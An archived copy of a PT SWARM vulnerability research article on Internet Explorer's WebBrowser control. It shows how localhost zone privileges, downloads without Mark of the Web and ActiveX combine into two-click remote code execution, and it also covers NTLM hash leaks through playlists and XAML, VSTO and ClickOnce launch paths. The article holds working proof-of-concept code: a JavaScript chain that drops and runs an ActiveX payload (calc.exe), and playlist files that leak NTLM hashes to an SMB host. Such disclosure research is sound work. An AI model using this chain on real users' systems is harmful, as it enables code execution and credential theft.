---
type: Article
title: "The Click that shouldn’t have worked: RCE via clickjacking in Internet Explorer"
description: "Internet Explorer's engine still ships as the WebBrowser control inside .NET and VB applications. A file downloaded through http://localhost arrives with no Mark of the Web, so a dropped HTML page runs as a local file and reaches WScript.Shell through ActiveX. Further sections add an NTLM leak, UXSS, XAML and ClickOnce handlers, and clickjacking and drag-and-drop paths to two-click RCE."
resource: "https://swarm.ptsecurity.com/the-click-that-shouldnt-have-worked-rce-via-clickjacking-in-internet-explorer/"
tags: [article, webseclist-reference, en-US, pt-swarm, rce, activex, clickjacking, ntlm, attack-chain, sop-bypass, xss, info-leak, owasp-a01-2021, owasp-a03-2021, owasp-a04-2021]
generated:
  by: webseclist-refs/1
  at: "2026-08-19T00:34:37+00:00"
status: stable
stale_after: 2027-08-19
sources:
  - id: original
    resource: "https://swarm.ptsecurity.com/the-click-that-shouldnt-have-worked-rce-via-clickjacking-in-internet-explorer/"
    title: "The Click that shouldn’t have worked: RCE via clickjacking in Internet Explorer"
    author: Igor Sak-Sakovskiy, @Psych0tr1a
also_at: []
authors:
  - Igor Sak-Sakovskiy
  - "@Psych0tr1a"
canonical_url: ""
cited_by:
  - "2026-ai.md:83"
commit: ""
content_sha256: 3eb7879824086365664fab263ca74dacb496279d6d3a0523cdc9806df242f2c6
depth: full
depth_reason: default
kind: article
language: en-US
licence: unknown
original_url: "https://swarm.ptsecurity.com/the-click-that-shouldnt-have-worked-rce-via-clickjacking-in-internet-explorer/"
published: ""
publisher: PT SWARM
publisher_english: ""
raw_sha256: 767137254825fd4183b1b53d9ea381591d9136b0b603e7e8276e30e30d40a838
retrieved_from: "https://swarm.ptsecurity.com/the-click-that-shouldnt-have-worked-rce-via-clickjacking-in-internet-explorer/"
retrieved_kind: stored
retrieved_utc: "2026-08-19T00:34:37+00:00"
slug: pt-swarm-click-that-shouldnt-have-worked-rce-clickjacking-internet-explorer
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# The Click that shouldn’t have worked: RCE via clickjacking in Internet Explorer

**The Click that shouldn’t have worked: RCE via clickjacking in Internet Explorer** - Igor Sak-Sakovskiy, @Psych0tr1a, PT SWARM.

- Published: date not stated
- Original: <https://swarm.ptsecurity.com/the-click-that-shouldnt-have-worked-rce-via-clickjacking-in-internet-explorer/>
- Preserved from: https://swarm.ptsecurity.com/the-click-that-shouldnt-have-worked-rce-via-clickjacking-in-internet-explorer/ (stored) on 2026-08-19
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

*Author’s note: this article describes vulnerabilities in ascending order of severity. If you want to skip straight to the most interesting part, feel free to read it from the bottom up.*

Even though Internet Explorer officially reached its end of life in 2020, its core engine remains widely used in the form of the WebBrowser control. This component is used in applications written in Visual Basic, .NET, and C#.

Recently, I have discovered and documented several vulnerabilities in software using WebBrowser. A notable example is my research titled [WinRAR’s vulnerable trialware: when free software isn’t free](https://swarm.ptsecurity.com/winrars-vulnerable-trialware-when-free-software-isnt-free/), which details how a MITM attack could lead to remote code execution in one of the world’s most popular file archivers.

While preparing this research, I tried to find information regarding the official status of the WebBrowser control. Surprisingly, no official documentation states that it is no longer supported or about to be deprecated. Furthermore, it appears that while I was working on this article, Microsoft restricted access to IE Mode in Edge even further. This came in response to the [discovery of APT attacks](https://microsoftedge.github.io/edgevr/posts/Changes-to-Internet-Explorer-Mode-in-Microsoft-Edge/#the-exploit-chakra-and-entry-point-abuse) using social engineering tactics.

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/d8068ff3-image.png)

## Useful information

Before we dive into the research, let’s break down some key terms that will appear frequently. This will help avoid any confusion when we analyze the vulnerabilities.

- **ActiveX**. A deprecated Microsoft framework that allows Internet Explorer to access the APIs of third-party libraries installed on the operating system. A new ActiveX object can be instantiated using a CLSID or a ProgID.
- **CLSID (class identifier)**. A 128-bit number serving as a universally unique identifier for a specific software component or COM object.
- **ProgID (programmatic identifier)**. A human-readable text string used in Windows to identify COM objects or file associations.
- **Component Object Model (COM)**. A Microsoft technology that enables software components to interact independently of the programming language they were written in. Developers interact with an object through its interface without needing to understand its internal implementation.
- **Mark of the Web (MOTW)**. A tag applied to files downloaded from the internet. When you run such a file, Windows displays a security warning. You can check for this tag using the following PowerShell command:
`Get-Content –Path C:/file.txt –Stream zone.identifier`
- **Same-origin policy (SOP)**. A fundamental security mechanism in browsers that prevents a document or script loaded by one origin to interact with a resource from another origin.
- **NTLM (NT LAN Manager)**. A Windows authentication mechanism. An NTLM leak occurs when an attacker captures encrypted authentication requests for subsequent GPU-based bruteforcing.
- **Security zones**. A set of rules and restrictions in Internet Explorer assigned to a resource based on its origin.

### ActiveX: how it works

The first thing we need to discuss is Microsoft’s legacy ActiveX framework. This framework was used to create software components that ran in the Windows environment, including in Internet Explorer. Due to security risks and obsolescence, its use is highly discouraged; however, it still functions within the WebBrowser component and IE itself.
Let’s look at an example of code using `CLSID 22D6F312-B0F6-11D0-94AB-0080C74C7E95`. This identifier is stored in the registry at `HKEY_LOCAL_MACHINE\Software\Microsoft\Active Setup\Installed Components` and corresponds to Windows Media Player.
Using this code, we can play a media file named `test.mp3` via ActiveX:

```xml
<object classid="CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95">
    <param name="URL" value="test.mp3"/>
</object>
```

There is another way to instantiate an ActiveX object: via a ProgID. In the example below, we access Windows Media Player through the string `WMPlayer.OCX`, creating an instance of the object using JavaScript:

```xml
<script type="text/javascript">
    var player = new ActiveXObject("WMPlayer.OCX");
    player.URL = 'test.mp3';
</script>
```

What happens when this code is executed?
An instance of Windows Media Player will be created, and the test.mp3 file will be sent to it to be played.

### Mark of the Web (MOTW)

Now let’s look at security markers. Imagine I have two HTML files in my `~/Downloads` folder:

- I created the first file in Notepad (local file).
- The second one was downloaded from the internet.

Let’s check their MOTW tags:

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/10d7f64a-image.png)

The results are as follows:

- `test_motw_1.html` (🖥️ – local file). The file has no MOTW tag; an empty Stream error is returned.
- `test_motw_2.html` (🌐 – downloaded from internet). The file is tagged with MOTW, security zone 3 (`ZoneId=3`).

### Security zones

Since we mentioned `ZoneId=3`, let’s take a closer look at how security zones actually work. Internet Explorer uses a zone-based security model, where each zone has a specific privilege level and component access rights.

| Value | Setting | Details |  |
| 0 | My Computer | file:/// |  |
| 1 | Local Intranet Zone | http(s)://192.168.*.*; http://10.*.*.* |  |
| 2 | Trusted sites Zone | Configurable by the user |  |
| 3 | Internet Zone | http(s)://internet.site/ |  |
| 4 | Restricted Sites Zone | Configurable by the user |  |

During my experiments, I discovered that the browser has two special zones that are difficult to place in the list above: **localhost** and **file://smb/**.

Characteristics of localhost:

- Has access to numerous ActiveX components (unlike arbitrary internet sites).
- Has access to remote SMB servers by default, as if they were in the same zone.

Characteristics of file://smb/:

- Uses the file:// URL scheme.
- Leads to NTLM leaks by design.
- Does not have direct access to local files (unlike file:///C:/).

Let’s check if the privileges of a page hosted on localhost differ from those on an intranet page. To do this, we’ll try opening a file from an SMB server by clicking the following link:

```
<a href="file://smb/folder/file" target="test"></a>
```

Based on the test results, we observed the following:

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/ccc528c5-image.png)

**You can** open files from an SMB server ([file://smb/](file://smb/)) using a page hosted at [http://localhost/](http://localhost/). **You cannot** download files from an SMB server ([file://smb/](file://smb/)) using a page hosted at [http://10.0.0.100/](http://10.0.0.100/).
It appears that localhost has elevated privileges compared to standard internet or intranet sites. Based on this, we can build a hierarchy of security zones based on their privileges:

| Zone | Privileges |  |
| 🌐[http://internet.site/](http://internet.site/)
*(Lowest privileges)* | Can only access the safest ActiveX components.
Can open [http://localhost](http://localhost/) and [ftp://localhost](ftp://localhost/) |  |
| 🖥️[http://localhost/](http://localhost/) and [ftp://localhost/](ftp://localhost/)
*(Medium privileges)* | Can access [file://smb/](file://smb/)
Have access to numerous ActiveX components |  |
| 💻 file:///C:/ and [file://localhost/C:/](file:///C:/)
*(Highest privileges)* | Have direct access to local files.
Have access to the most insecure ActiveX components, such as WScript.Shell |  |

## Backstory

### Part 1. Access to local files

A few years ago, I started hunting for insufficient HTML sanitization in desktop applications that could be exploited for Cross-Site Scripting (XSS). My goal was to perform remote code execution or find something interesting or unusual by executing arbitrary scripts within the application.

I installed a bunch of potentially vulnerable apps and kept a running log of my findings in a spreadsheet. Today, we will break down one of those findings. Initially, I dismissed this particular case because, at first glance, it seemed difficult to escalate to RCE. My primary focus was finding instances where JavaScript is executed under the file:// origin. Later, I revisited my notes, tested my hypothesis thoroughly, and realized that the issue I had accidentally stumbled upon wasn’t rooted in the application itself or its configuration, but in Internet Explorer itself.

*One of those notes (a random result from manual fuzzing)*

> When I executed `alert(location)` in the desktop app, the popup displayed [http://localhost](http://localhost/). All standard methods for opening new windows were disabled, except for `showModalDialog`. I tried opening an HTML page from a test SMB server—and it loaded successfully.
>
```
<script>
    showModalDialog('file://localtest.me/users/root/test.html')
</script>
```
>
> My next step was to execute HTML code on the SMB server. Later, I discovered that the SMB server wasn’t even necessary: the exact same behavior could be reproduced on a local web application ([http://localhost](http://localhost)) by specifying the `<base href="file:///">` tag.
>
> Here is the code that would be hosted on the SMB server (`test.html` file):
>
```
<!-- file://localtest.me/users/root/test.html -->
<iframe></iframe>
<script>
    frames[0].name='test';
    window.open('//localhost//\\\\localhost\\c:\\users\\root\\test321.html', 'test');
    window.open('//localhost/c:/users/root/test321.html', 'test'); // equivalent file:///c:/users/root/test321.html
</script>
```

In this example, we open two links in a row. If you open the first link, pause, and then open the second, a popup will appear before the second link executes, stating that the URL is invalid or malformed. However, if you open the links in rapid succession, the popup doesn’t have time to appear.

During testing, I manually tested various links. One of them triggered that exact popup, but after I closed it, links that were not supposed to open suddenly did. I managed to reproduce this behavior and eventually found a way to bypass the popup entirely, minimizing user interaction.

Ultimately, this behavior allows an attacker to open local HTML files. Simply put, we found a portal from the internet to local files, using [http://localhost](http://localhost) as a proxy.

**Important limitation:** to exploit this feature, an attacker must first find a way to drop an HTML file onto the victim’s computer (for example, via previous attack stages or social engineering), and the victim must be running a web application vulnerable to XSS at [http://localhost](http://localhost/).

Today, having a web application constantly running at [http://localhost](http://localhost%20is/) is not uncommon. This could be:

- An email client
- A development environment
- LAMP/XAMPP builds
- Electron-based applications
- Software like uTorrent

### Part 2. Downloading arbitrary files without MOTW

The most logical next step would be to try forcing the browser to download a malicious file, right? However, Internet Explorer prevents file from being saved to disk without user interaction; it always requires explicit confirmation.

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/eb7d712f-image.png)

It took me eight months of research to find the easiest bypass. It turns out that Internet Explorer can open a page in Microsoft Edge without any user interaction by using a link formatted as `microsoft-edge:http://site`. And because modern Edge is Chromium-based, it can automatically save files to `~/Downloads/` without asking any questions.

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/33c4cbb8-image.png)

Unfortunately, I cannot disclose the details of the vulnerable application used in this example, but the screenshot above shows an ActiveX security warning. This warning appears when a local file attempts to instantiate a highly insecure COM object—`WScript.Shell`. I am showing the final stage of the attack where the malicious `WScript.Shell` is attempting to instantiate and is requesting user permission. Not all COM objects request such permissions—only those that are well known and lead to command execution, data leaks, or other unsafe events.

When testing this behavior, I used [http://localhost](http://localhost%20for/) for the page that initiated the file download. When the file was saved and executed, I achieved **1-click RCE** by clicking “Yes” in the warning.

However, when I repeated the test under more realistic conditions using [http://attacker/](http://attacker/) instead of [http://localhost](http://localhost/), RCE failed. After a few experiments, I figured out why: when downloaded via [http://localhost](http://localhost/), the file is saved **without the MOTW tag**. Without this tag, Windows does not block dangerous operations. In this specific HTML scenario, the ActiveX warning becomes the only barrier preventing total system compromise. This deviates slightly from standard IE behavior and looks like a misconfiguration; normally, when IE opens a local file, it displays an additional security prompt asking for permission to run JavaScript from a local file.

*And finally, we get to the most interesting part—the bugs.*

## Bug 1. Auto-download and auto-execution of local files: building the attack chain

💥 Security Issue, [VULN-138925](https://msrc.microsoft.com/report/vulnerability/VULN-138925)

Now we can attempt to download an HTML file without the MOTW tag and execute it immediately. Local files without MOTW allow us to use a very old technique from the 2000s: remote code execution via the `WScript.Shell` COM object.

The logic behind the RCE via `WScript.Shell`:

- A malicious page opens [http://localhost](http://localhost) hosting an application vulnerable to XSS, using it as Explorer (legitimate technique).
- The XSS payload at [http://localhost](http://localhost) launches an Edge window, pointing to its own location.
- Using the Edge window, the XSS payload at [http://localhost](http://localhost%20forces/) forces *exploit.html* to download into the `~/Downloads/` folder **without the MOTW tag**. The Edge window can then be closed automatically.
- The IE window redirects the XSS from localhost to the locally saved exploit, leveraging the unclassified vulnerability described earlier.

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/733d6342-temp-1.gif)

*Demo*

To achieve arbitrary code execution (RCE) in Internet Explorer, only **two clicks** on security prompts are required.

The final JavaScript code resulting in RCE in Internet Explorer (requiring two clicks on security prompts):

```html
<script>
getUsername = function () {
  // We need to obtain here a current username via file read or NTLM leak
  setTimeout("runHtml('vboxuser')", 500);
};
runHtml = function (usr) {
  frame = document.createElement("iframe");
  frame.name = "test2";
  window.open(
    "//localhost//\\\\localhost\\c:\\users\\" +
      usr +
      "\\Downloads\\test321.html",
    "test2",
  );
  window.open(
    "//localhost/c:/users/" + usr + "/Downloads/test321.html",
    "test2",
  );
  document.documentElement.appendChild(frame);
};
runEdge = function () {
  window.open("microsoft-edge:" + location + "#step2", "test");
};
function dropHTML1() {
  const data = `<object classid='clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8' id='exploit'></object>
		<script>
		onload=function(){
		try{
		exploit.run('calc.exe')
		}catch(e){alert(e.message)}
		}
		<\/script>`;
  const blob = new Blob([data], { type: "text/html" });
  const link = document.createElement("a");
  link.href = URL.createObjectURL(blob);
  link.download = "aaa.html";
  link.click();
  URL.revokeObjectURL(link.href);
  setTimeout(function () {
    window.close();
  }, 500);
}
if (location.hash == "#step2") {
  dropHTML1();
} else {
  runEdge();
  setTimeout("getUsername()", 5000);
}
</script>
```

## Bug 2. NTLM token leak from any website

💥 Security Issue, [VULN-139365](https://msrc.microsoft.com/report/vulnerability/VULN-139365)

While searching for ways to download files, I tested numerous built-in IE features, which led me to discover several other flaws. I found one of them while investigating what else JavaScript could do on [http://localhost](http://localhost/).

If you try to open .css file from [http://localhost](http://localhost/), it will not open in Internet Explorer; instead, it will open in a new Notepad.exe process.

Example of HTML code with a link to a CSS file that opens Notepad when clicked:

```html
<a href="test.css">Open notepad from localhost</a>
```

Internet Explorer first downloads the file to a temporary folder with a randomly generated name, and then the browser starts a new Notepad process to open it.
Using a simple fuzzer that opened every registered file extension on my Windows system one by one, I managed to launch various processes. The table below shows examples of file extensions and the applications they launch:

| **Extension** | **Started application** |  |
| .css | notepad.exe |  |
| .dic | notepad.exe |  |
| .vsd | visio.exe |  |
| .wax | wmplayer.exe |  |
| .wmd | wmplayer.exe |  |
| .wmx | wmplayer.exe |  |
| .wmz | wmplayer.exe |  |
| .jnlp | java.exe |  |
| .application | rundll32.exe |  |
| .xaml | PresentationHost.exe |  |
| .xbap | PresentationHost.exe |  |
| .pdf | Acrobat.exe |  |
| .xdp | Acrobat.exe |  |
| .xfdf | Acrobat.exe |  |
| .xps | xpsrchvw.exe |  |

The most peculiar extensions:

- Windows Forms / ClickOnce: .xaml, .xbap, .vsto. XML files containing the URL of a manifest file and binary data for execution.
- Windows Media: .wmd, .wmz. ZIP archives with settings and skins; .wax, .wmx. XML playlists.

Let us focus on the playlists. Since Windows Media Player can be launched from IE via ActiveX from any site, we can test more supported playlist formats by launching the player first and then feeding it the necessary files:

```html
<script type="text/javascript">
    var player = new ActiveXObject("WMPlayer.OCX");
    player.URL = 'test.wax';
</script>
```

I conducted further tests using the ActiveX object and other playlist extensions, yielding more results than redirecting from [http://localhost](http://localhost/).

- Column 1: the tested extension
- Column 2: results of opening files from [http://localhost](http://localhost/)
- Column 3: results of launching files via ActiveX.

| **Extension** | **Opening files from **[**http://localhost**](http://localhost/) | **Running files via ActiveX** |  |
| .wax | **✅** | **✅** |  |
| .wmx | **✅** | **✅** |  |
| .wvx | ❌ | **✅** |  |
| .asx | ❌ | **✅** |  |
| .m3u | ❌ | **✅** |  |

**Why are playlists so interesting?** Because they can contain URLs of files on a remote SMB server, automatically exposing NTLM hashes **during playback!**

.M3U NTLM leak Proof of Concept:

```
#EXTM3U
#EXTINF:-1 tvg-id="3" tvg-name="For Bigger Blazes" tvg-logo="images/ForBiggerBlazes.jpg" group-title="Movies", For Bigger Blazes
file://smb/test/audio.m3u
```

.WAX/.WMX/.WVX/.ASX NTLM leak Proof of Concept:

```xml
<ASX VERSION="3.0">
  <ENTRY CLIENTSKIP="NO">
    <TITLE>Item 1</TITLE>
    <REF HREF="file://smb/test/audio.asx" />
  </ENTRY>
</ASX>
```

## Not a bug, but a feature 3

🐛 Feature, [VULN-138937](https://msrc.microsoft.com/report/vulnerability/VULN-138937), [VULN-169397](https://msrc.microsoft.com/report/vulnerability/VULN-169397)

Let us return to the Windows Forms and ClickOnce file extensions. I stumbled upon these files again while reviewing Internet Explorer’s security zones.

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/1d006470-image.png)

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/9323f59b-image-2026-5-25_14-20-23-1.png)

In the security zone settings, there are options such as “Loose XAML” and “XAML browser applications.” By default, for the “Local intranet” and “My computer” zones, these are set to “Enable” or “Prompt.” This means that files with specific extensions can be executed with minimal user interaction, sometimes with no notification at all, sometimes requiring just one additional click.

**Which extensions fall into this category?**
You can open files with the following extensions from**[*http://localhost*](http://localhost%20and/)and from local files (`file:///`):

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/19951d9f-image.png)

- .XAML. Extensible Application Markup Language (application/xaml+xml)
- .XBAP. XAML Browser Applications (application/x-ms-xbap)
- .VSTO. Visual Studio Tools for Office (application/x-ms-vsto)
- .APPLICATION. ClickOnce (application/x-ms-application)

Let us analyze the extensions.

### 1. Extensible Application Markup Language (.XAML)

XAML is an XML-based markup language used to define user interfaces in .NET applications. When opened in Internet Explorer, it does not trigger security errors or confirmation popups. XAML allows the instantiation of arbitrary classes, but with serious limitations: only static classes and methods are available, and the sandbox strictly restricts access to system functions.

Example XAML file:

```
<?xml version="1.0" encoding="UTF-8"?>
<Page
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
    xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
    xmlns:local="clr-namespace:WpfBrowserApp1"
    mc:Ignorable="d"
    xmlns:sys="clr-namespace:System;assembly=System.Runtime"
    xmlns:sxml="clr-namespace:System.Xml;assembly=System.Xml, Version=4.0.0.0, Culture=neutral"
    d:DesignHeight="450" d:DesignWidth="800" Title="Page1">
    <Page.Resources>
        <ObjectDataProvider x:Key="concatenatedString" ObjectType="{x:Type sys:String}" MethodName="Concat">
            <ObjectDataProvider.MethodParameters>
                <sys:String>abcdefg</sys:String>
                <sys:String>hijklmno</sys:String>
            </ObjectDataProvider.MethodParameters>
        </ObjectDataProvider>
        <ObjectDataProvider x:Key="concatenatedString2" ObjectInstance="{StaticResource concatenatedString}" MethodName="IndexOf">
            <ObjectDataProvider.MethodParameters>
                <sys:String>m</sys:String>
            </ObjectDataProvider.MethodParameters>
        </ObjectDataProvider>
    </Page.Resources>
    <Grid Name="Grid1">
        <StackPanel Background="Aquamarine">
            <TextBlock>
                <TextBlock.Text>
                        <Binding Source="{StaticResource concatenatedString}" Path="Length" />
                </TextBlock.Text>
            </TextBlock>
            <TextBlock>
                <TextBlock.Text>
                        <Binding Source="{StaticResource concatenatedString}" />
                 </TextBlock.Text>
            </TextBlock>
        <TextBlock>
                <TextBlock.Text>
                        <Binding Source="{StaticResource concatenatedString2}" />
                 </TextBlock.Text>
            </TextBlock>
        </StackPanel>
    </Grid>
</Page>
```

**What happens when this file is opened in Internet Explorer?**

- The `xmlns:sys` declaration in XAML references the `System` namespace from the .NET assembly.
- An object `ObjectDataProvider` is created, which calls the static method `Concat` of the `System.String` class with the arguments “`abcdefg`” and “`hijklmno`“. This results in the string “`abcdefghijklmno`“.
- Next, the second `ObjectDataProvider` is created. It takes the result of the first operation (the object with the concatenated string) and calls the `IndexOf` method with the argument “`m`” to find the position of the character “`m`” in the string.
- Three values are displayed on the screen:

- The length of the concatenated string (the `Length` property)
- The concatenated string itself
- The result of calling the `IndexOf` method (the position of the character “`m`*“*)

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/87c241f3-image.png)

**Attempts to escape the sandbox**
I tested the possibility of performing more dangerous actions via XAML. The results were predictable:

```csharp
Windows.Forms.MessageBox.Show("test", "test")
// ✅ Executes: shows a pop-up window on top of all windows

System.Net.Dns.GetHostEntry("google.com")
// ❌ System.Security.SecurityException: Request for the permission of type 'System.Net.DnsPermission'

System.IO.File.ReadAllText("/path/to/../../../file_outside_base_directory")
// ❌ System.Security.SecurityException: Request for the permission of type 'System.Security.Permissions.FileIOPermission'
```

XAML operates in strict isolation—a .NET sandbox from which dangerous system functions cannot be called without additional permissions.

**Testing various ways to load XAML**
To understand where and how XAML files can be launched, I created two test HTML files with different opening methods, which we will open from localhost/xaml.html, [file://smb/xaml.html](file://smb/xaml.html), and as a local file file:///c:/xaml.html.

The first method is opening an HTML file and then an .XAML file from the same origin (same location test):

```xml
<!-- xaml1.html: for testing file execution from the same origin -->
<iframe src=".\xaml\" style="height:500;width:500"></iframe>
<iframe src=".\xaml\test2.xaml" style="height:500;width:500"></iframe>
<a href=".\xaml\test2.xaml" style="height:500;width:500">test</a>
```

The second method is opening an HTML file and then an .XAML file from an SMB server (testing opening via origin chains):

```xml
<!-- xaml2.html—for testing opening from SMB via the chains -->
<iframe src="\\smb\Users\root\ie\motw\xaml\" style="height:500;width:500"></iframe>
<iframe src="\\smb\Users\root\ie\motw\xaml\test.xaml" style="height:500;width:500"></iframe>
<a href="\\smb\Users\root\ie\motw\xaml\test2.xaml" style="height:500;width:500">test</a>
```

**Explanation of the elements in each test:**

- The first `<iframe>` shows a directory listing (like Windows Explorer). If you open a folder via the**`file://` scheme, an Explorer interface appears where you can double-click a file to launch it.
- The second `<iframe>` attempts to automatically load and display the XAML file.
- The `<a>` element is designed to launch the file by clicking on it.

**Test results: **

| Same-origin tests | Opening xaml1.html from [http://localhost/](http://localhost/) | Opening xaml1.html from [file://smb/](file://smb/) | Opening xaml1.html from file:/// |  |
| Test1 (folder, double click) | 🛑 (does not output the required listing over http/s) | ❌ | ❌ (launches Edge) |  |
| Test2 (iframe with file) | **✅** | ❌ | **✅** |  |
| Test3 (click on link) | **✅** | ❌ | **✅** |  |

| SMB tests (origin → [file://smb/](file://smb/)) | Opening xaml2.html from [http://localhost/](http://localhost/) | Opening xaml2.html from [file://smb/](file://smb/) | Opening xaml2.html from file:/// |  |
| Test1 (folder, double click) | ❌ (launches Edge) | ❌ | ❌ (launches Edge) |  |
| Test2 (iframe with file) | ❌ | ❌ | ❌ |  |
| Test3 (click on link) | ❌  | ❌ | ❌ |  |

**Observations when testing different launch methods from different origins:**

- Directory listing via the http:// protocol does not work—it does not trigger the required functionality.
- Double-clicking on the frame with a directory listing launches Edge instead of IE.
- Launching XAML from [file://smb/](file://smb/) is completely disabled, or rather broken due to IE being disabled and all links being redirected to open in Edge.

**Conclusions on .XAML:**

- It allows us to run .NET classes but inherits the security context from the XAML document, which strictly limits its capabilities.
- It is the only format in its group that shows absolutely no security prompts upon launch.
- Other extensions (.VSTO, .APPLICATION, .XBAP), when tagged with MOTW, do not show classic security prompts but have their own notifications, which makes them less useful without active social engineering.
- The sandbox can be bypassed by using undocumented features of available classes, finding a chain that does not inherit the context, or exploiting memory-related .NET vulnerabilities.

### 2. Visual Studio Tools for Office (.VSTO)

.VSTO are plugins for Microsoft Office applications. A compiled .vsto file is an XML document containing a digital signature and a link to the main manifest (`.dll.manifest`).

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/779e7c0b-image.png)

*Example of .VSTO file contents after compilation*

Example of the source code for a VSTO plugin that launches calc.exe:

```
Public Class ThisAddIn
    Private Sub ThisAddIn_Startup() Handles Me.Startup
        Dim wsh
        Try
            wsh = CreateObject("WScript.Shell")
            wsh.run("calc.exe")
        Catch E As Exception
            MsgBox(E.Message)
        End Try
    End Sub
    Private Sub ThisAddIn_Shutdown() Handles Me.Shutdown
    End Sub
End Class
```

Compiling this code results in a VSTO plugin that, when Excel is launched, attempts to execute the calc.exe command.

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/4b3a0def-temp.gif)

**Security prompts for .VSTO:**

As I mentioned earlier, this group of extensions (.VSTO, .APPLICATION, .XBAP) does not show classic Windows security alerts (like when running an .exe from the internet with a MOTW applied), but they have their own dialog boxes:

- Publisher warning
- Request for access to unsafe functions (for example, starting processes)
- Installation request
- File location information (in this case, without MOTW, the file is considered local)

An installed VSTO plugin can be removed via the standard “Apps and features” section in Windows settings.

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/ce0ba5e8-image.png)

**Important observations:**

- Autostarting via Test2 from local files triggers a security prompt requiring an additional click:
![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/1c0e0b39-image-2026-5-25_14-34-47-1.png)
- When Test1 from [http://localhost](http://localhost%20opens/) opens a folder on the SMB server, and the VSTO file is launched with a double-click from there, a different warning appears, also requiring a click:
![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/1b35b537-image-2026-5-25_14-35-4-1.png)

This tells us that the**[http://localhost](http://localhost/) → [file://smb/](file://smb/) chain is less privileged than `file:///` → [file://smb/](file://smb/), as it displays an additional pop-up window. However, launching directly from [http://localhost ](http://localhost%20does/)does not have the restrictions that `file://` has.

**Conclusions for .VSTO:**

- It allows us to inject backdoors into Office applications.
- It requires complex social engineering techniques to trick the victim into clicking the security pop-up.
- It can be launched from a remote SMB server, but loading it via the [http://localhost](http://localhost/) → [file://smb/](file://smb/) chain requires an extra click for confirmation.

### 3. ClickOnce (.APPLICATION)

Unlike VSTO plugins, the ClickOnce technology allows us to create fully-fledged console and windowed applications that run in isolation, rather than inside Office applications.

Example of C# source code that launches calc.exe:

```csharp
using System;
using System.Diagnostics;

class Program
{
    static void Main()
    {
        try
        {
            Process process = new Process();
            process.StartInfo.FileName = "calc.exe";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            string result = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            Console.WriteLine(result);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Err: " + ex.Message);
        }
    }
}
```

After compilation and publishing via ClickOnce, we obtain a file with the .application extension, which attempts to install and execute the application.

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/74695b13-temp-2.gif)

**Note:**

- Autostarting via Test2 (iframe with the file) triggers a security window requiring confirmation (just like with .VSTO).
- Opening via a double-click from the [file://smb/](file://smb/) folder works perfectly from both types of start pages ([http://localhost/](http://localhost/) and file:///).

**Conclusions on .APPLICATION:**

- It allows us to execute commands immediately after clicking through the security warning.
- It requires complex social engineering methods to force the victim to click the pop-up.
- It can be launched from an SMB server in a specific way (via double-click in Explorer).

### 4. XAML Browser Applications (.XBAP)

As the name suggests, this type of application runs directly in the browser (although technically it is a separate process). XBAPs are .NET applications that run in the browser’s sandbox but can execute arbitrary code if granted the appropriate permissions.

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/8ca83f5e-temp-3.gif)

Security prompts are similar to .VSTO and .APPLICATION, except that the installation is now considered “trusted.”

**Observations when testing different launch methods from different origins:**

- Autostarting via Test2 from file:/// shows a security prompt (like .VSTO).
- Launching via double-clicks in the [file://smb/](file://smb/) folder is broken—Edge opens instead of IE (like with .XAML).

**Conclusions on .XBAP:**

- It allows us to execute commands after confirming the risk (clicking the pop-up window).
- It requires complex social engineering techniques.
- It cannot be launched from an SMB server.

### 5. Bonus: Microsoft Edge

Unlike Internet Explorer, files with `.application` and *`.vsto`* extensions can be launched from any website in Microsoft Edge, not just from [http://localhost](http://localhost/). However, an additional click is now introduced—a confirmation window similar to the one that appears when launching a third-party process via a URL scheme in Chromium (for example, when launching calculator: URL).

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/6193e3aa-temp-4.gif)

This makes an attack via Microsoft Edge slightly less attractive, but still possible with clever social engineering.

## Not a bug, but a feature 4. UXSS

🐛 Feature, [VULN-139367](https://msrc.microsoft.com/report/vulnerability/VULN-139367), [VULN-169397](https://msrc.microsoft.com/report/vulnerability/VULN-169397)

Some browsers support the MHTML (MIME HTML) web archive format, and Internet Explorer is no exception. Moreover, IE has its own URL scheme for this format: `mhtml:`. The syntax of the MIME HTML web archive is similar to the `multipart/form-data`**HTTP request and often uses similar content types: `multipart/related` or `multipart/mixed`. IE allows us to create a web archive from any page with a simple Ctrl+S keyboard shortcut.

I discovered that a local `.mht` file that** lacks a MOTW tag** and includes two specific headers can lead to a Same Origin Policy (SOP) bypass. This file allows us to emulate an arbitrary Origin and execute arbitrary JavaScript on any site.

**What are these special headers?**

- `Content-location: http://test.com/abc`
This header indicates the URL from which a specific part of the page was saved. It seems that this header overwrites the Origin of the contained HTML page.
- `Content-ID: <abc123>`
This header creates a virtual URL like `cid:abc123`, which can be used to load a specific part of the page.

Example of loading content using CID links:

```
<img src="cid:abc123"/>
